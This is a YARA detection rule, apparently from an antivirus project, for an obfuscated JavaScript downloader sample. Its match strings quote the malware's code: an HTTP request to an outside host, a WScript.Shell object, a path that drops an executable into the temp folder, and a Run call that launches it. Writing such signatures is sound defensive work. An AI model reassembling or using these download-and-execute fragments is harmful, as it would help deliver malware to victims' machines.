rule sig_20160330_e17603c0d51de2e286813a1125b11a90 {
  meta:
    description = "datamaliciousorder - file 20160330_e17603c0d51de2e286813a1125b11a90.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "55e786dee75007ded93a84a228a99ec7475efe181b6f0ce5a7f525b557bab8ae"

  strings:
    $s1  = "function _C0(_JM, _WE){_S = _S * 1; return _JM - _WE;};" fullword ascii
    $s2  = "_R[_WI](\"GET\", \"http://ccluke.cn/b7eus\", false);" fullword ascii
    $s3  = "var _I = function _VH() {return WScript[_WP](\"WScript\"+\".Shell\");}(), _CB = 11;" fullword ascii
    $s4  = "if (_R[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _IX() {return _I[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"7gBoE706.ex\" + \"e\";};" fullword ascii
    $s6  = "function _XE(){return _JU + \"\";};" fullword ascii
    $s7  = "function _Z(_QO){_I[\"Run\"](_QO, _S, _S);};" fullword ascii
    $s8  = "function _B() {return ((_ZC == true) && (_ZC == _F)) ? 1 : _S;};" fullword ascii
    $s9  = "function _C()" fullword ascii
    $s10 = "var _G = new this[\"Date\"]();" fullword ascii
    $s11 = " while (_T){" fullword ascii
    $s12 = "function _VL(_OB) {var _V = (1, 2, 3, 4, 5, _OB); return _V;};" fullword ascii
    $s13 = "function _ID(){return _WP;};" fullword ascii
    $s14 = "function _NV(){return 22;};" fullword ascii
    $s15 = "return _C0(_Z1, _Q);" fullword ascii
    $s16 = "_F = true; " fullword ascii
    $s17 = "_ZC = true; " fullword ascii
    $s18 = "var _ZC = false;" fullword ascii
    $s19 = "var _SL = false;" fullword ascii
    $s20 = "} catch(_CW){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}